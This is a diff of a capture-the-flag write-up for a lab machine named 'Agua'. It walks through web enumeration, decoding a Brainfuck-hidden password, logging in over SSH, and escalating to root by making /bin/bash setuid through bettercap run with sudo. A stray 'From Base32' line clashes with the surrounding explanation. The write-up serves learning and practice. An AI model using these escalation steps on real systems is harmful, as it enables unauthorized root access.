@@ -20,15 +20,22 @@ PORT   STATE SERVICE REASON
 ## Examining the Web Page and Its Infrastructure
 We access the web page hosted on the Apache server and find this:
 
- (Foto comentarios pagina web)
+![alt text](Imagenes/Agua_1.png)
 
+```ruby
+<!--
+++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
+-->
+
+```
+From Base32
  It seems we have encountered Brainfuck code, so we need a Brainfuck to ASCII translator. This word appears, which could be a possible password
 
 ```ruby
 bebeaguaqueessano
 ```
 
-(Foto del traductor)
+![alt text](Imagenes/Agua_2.png)
 
 Now we perform a subdomain enumeration using the tool GoBuster, obtaining the following:
 
@@ -36,14 +43,14 @@ Now we perform a subdomain enumeration using the tool GoBuster, obtaining the fo
 gobuster dir -u http://172.17.0.2/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
 
 ```
+![alt text](Imagenes/Agua_3.png)
 
-Foto de agua ssh
 
 ## Examining the agua_ssh.jpg Image
 
 We download the image and use tools like ExifTool or Steghide to check if there is any secret inside it. However, we do not find anything.
 
-foto exiftool 
+![alt text](Imagenes/Agua_4.png)
 
 ## Intrusion
 
@@ -53,26 +60,36 @@ user: agua
 password: bebeaguaqueessano
 ```
 
-foto de intrusion
+![alt text](Imagenes/Agua_5.png)
 
 
 ## Escalation privilege
 
 With the id command, we see that we belong to the lxd group. Possibly, if we exploit this vulnerability, we can escalate privileges.
 
-
 We will see that we have a file named alpine-v3.13-x86_64-20210218_0139.tar.gz, which makes it almost certain that we should exploit lxd. But no, this is nothing more than a rabbit hole.
+
+![alt text](Imagenes/Agua_6.png)
 
 If we run sudo -l, we see that we can execute /usr/bin/bettercap as root.
 
-foto bettercap 
+```ruby
+agua@97aaababd117:~$ sudo -l
+Matching Defaults entries for agua on 97aaababd117:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User agua may run the following commands on 97aaababd117:
+    (root) NOPASSWD: /usr/bin/bettercap
+
+```
 
 If we open the file with sudo, we can make our bash appear with the following command:
-ruby
 
+![alt text](Imagenes/Agua_6.png)
 ```ruby
 ! chmod +s /bin/bash
 ```
+With this command, we will grant permissions for any user to execute a terminal with root privileges
 
 We close the application and execute the following command in a new terminal:
 
